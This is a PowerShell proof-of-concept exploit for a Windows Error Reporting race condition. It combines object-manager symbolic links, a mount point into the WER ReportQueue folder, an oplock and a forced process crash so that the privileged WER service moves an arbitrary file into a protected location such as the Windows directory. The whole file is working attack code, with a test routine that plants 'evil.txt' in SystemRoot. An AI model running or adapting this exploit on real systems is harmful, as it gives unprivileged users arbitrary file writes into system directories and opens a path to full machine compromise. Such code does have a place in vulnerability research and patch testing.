Import-Module "$PSScriptRoot\NtApiDotNet.dll" -ErrorAction Stop

$TempReportDir = "$env:SystemRoot\Temp\RQ"

function Invoke-MoveFileUsingWER($Source, $Destination) {
    Write-Host "Setting up dirs & files..."
    New-Item -Type Directory -Path $TempReportDir -Force | Out-Null
    Copy-Item "$PSScriptRoot\Report.wer" "$TempReportDir\Report.wer" -ErrorAction Stop
    Copy-Item "$PSScriptRoot\Report.wer" "$TempReportDir\Report.wer.tmp" -ErrorAction Stop

    Write-Host "Setting up pseudo-symlinks..."
    [NtApiDotNet.NtFile]::CreateMountPoint("\??\$env:ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e", "\RPC Control", $null)
    $wer = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\Report.wer", "\??\$TempReportDir\Report.wer")
    $wer_tmp = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\Report.wer.tmp", "\??\$TempReportDir\Report.wer.tmp")
    $tmp_file = [NtApiDotNet.NtFile]::Open("\??\$TempReportDir\Report.wer.tmp", $null, [NtApiDotNet.FileAccessRights]::ReadAttributes, [NtApiDotNet.FileShareMode]::All, [NtApiDotNet.FileOpenOptions]::None)

    Write-Host "Placing oplock..."
    $task = $tmp_file.OplockExclusiveAsync()

    Write-Host "Triggering WER..."
    Start-Process -NoNewWindow powershell.exe "-Command `"[Environment]::FailFast('Error')`""

    Write-Host "Waiting for oplock to trigger..."
    $task.Wait()

    Write-Host "Oplock triggered, switching symlinks..."
    $wer.Dispose()
    $wer_tmp.Dispose()
    $wer = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\Report.wer", "\??\$Destination")
    $wer_tmp = [NtApiDotNet.NtSymbolicLink]::Create("\RPC Control\Report.wer.tmp", "\??\$Source")

    Write-Host "Releasing Oplock..."
    $tmp_file.AcknowledgeOplock([NtApiDotNet.OplockAcknowledgeLevel]::No2)

    Write-Host "Waiting for wemgr process to finish..."
    Sleep -Seconds 1
    While ( -not (Get-Process -Name wemgr -ErrorAction SilentlyContinue) -eq $null ) {
        Sleep -Milliseconds 500
    }

    Write-Host "Cleanup..."
    $tmp_file.Close()
    $wer.Dispose()
    $wer_tmp.Dispose()
    [NtApiDotNet.NtFile]::DeleteReparsePoint("\??\$env:ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e") | Out-Null
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e" -Force
    Remove-Item -Path $TempReportDir -Recurse -Force
}

function Test-IsFileWritable($Path) {
    $result = $False
    Try {
        [IO.File]::OpenWrite($Path).close()
        $result = $True
    } Catch {
        $result = $False
    }
    return $result
}

# Use the bug to create a file in the Windows directory
function Test-Exploit($TargetFile) {
    if($TargetFile -eq $null) {
        $TargetFile = "$env:SystemRoot\evil.txt"
    }
    if(Test-Path $TargetFile) {
        Write-Warning "Target file already exists, exiting"
        return
    }
    New-Item -Type File -Path "$env:SystemRoot\Temp\testfile" -Value "test" -ErrorAction Stop | Out-Null
    Invoke-MoveFileUsingWER -Source "$env:SystemRoot\Temp\testfile" -Destination $TargetFile

    if (Test-IsFileWritable($TargetFile)) {
        Write-Host -ForegroundColor Green "File $TargetFile successfully created!"
        Get-Item $TargetFile
    } else {
        Write-Warning "File not created or not writable."
        Remove-Item -Path "$env:SystemRoot\Temp\testfile" -Force -ErrorAction SilentlyContinue
    }
}
